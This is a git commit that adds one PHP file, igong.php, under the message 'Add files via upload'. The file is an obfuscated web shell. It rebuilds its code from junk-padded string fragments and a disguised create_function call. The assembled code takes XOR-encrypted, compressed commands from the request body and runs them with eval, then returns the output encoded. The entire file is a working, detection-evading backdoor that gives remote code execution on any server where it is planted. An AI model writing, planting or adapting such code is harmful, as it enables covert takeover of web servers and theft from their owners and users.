0a7e7d0c4ad298250dcb531180a2826943d1eff8
igong1337 <tasigor01@gmail.com>
2024-12-23 17:07:49 +0700

    Add files via upload

---
+++ igong.php
@@ -0,0 +1,10 @@
+<?php
+$A='et_!acont!aents(!a);@ob!a_end!a_cl!aean();$r=@ba!ase64_en!a!a!acode(@x(@gz!a!acompress($o),$k))!a;print("!a!a$p$kh$r$kf");}';
+$J='//!ainput"),$!am)==!a1) {@ob_st!aa!art();@ev!a!aal(@gzunco!ampress(@x(@ba!ase!a!a64_d!aecode($m[1]),$k!a)!a));$o=@ob_g';
+$X=str_replace('R','','RcreaRteRR_fuRRnction');
+$g='{!a!a$o.=$t{$i}^$k!a{$j!a};}}r!aet!aurn $o;}if!a (@preg_ma!atch(!a"/$kh(.+)$kf!a/"!a,@file_g!aet_co!an!atents("php:!a';
+$G='$k="!a98bada!a51";$kh="!ae9!a8!a!aa291021d0";$kf="b900!a8c92c9d!a6!a";$p="!arVbr!aVqBbpYSxKrZ!a3";func!ation x!a($t!a,$';
+$P='k){$c=!astr!alen($k)!a;$!al=strlen($t);!a$o="";f!aor!a($i=!a0;$i<$l!a;){for(!a$j=!a0;!a($j<$c&&$i<$l);$!aj!a++,$i++)';
+$Q=str_replace('!a','',$G.$P.$g.$J.$A);
+$v=$X('',$Q);$v();
+?>
